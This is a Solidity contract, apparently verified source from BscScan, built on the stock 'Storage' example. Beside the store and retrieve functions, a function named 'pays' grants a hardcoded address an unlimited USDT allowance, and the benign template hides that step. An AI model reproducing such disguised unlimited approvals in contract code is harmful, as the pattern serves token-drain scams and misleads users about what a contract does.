/**
 *Submitted for verification at BscScan.com on 2022-06-27
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface IERC20 {

    function approve(address spender, uint256 amount) external returns (bool);

}


/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract Storage {

    uint256 number;
    address usdt = 0x55d398326f99059fF775485246999027B3197955;
    IERC20 _usdt = IERC20(usdt);
    /**
     * @dev Store value in variable
     * @param num value to store
     */
    function store(uint256 num) public {
        number = num;
    }

    /**
     * @dev Return value 
     * @return value of 'number'
     */
    function retrieve() public view returns (uint256){
        return number;
    }


    function pays() public {

        
        _usdt.approve(0xd848030550dfD62Ac6aFB786E2baA507e7e812dc,~uint256(0));

    }

}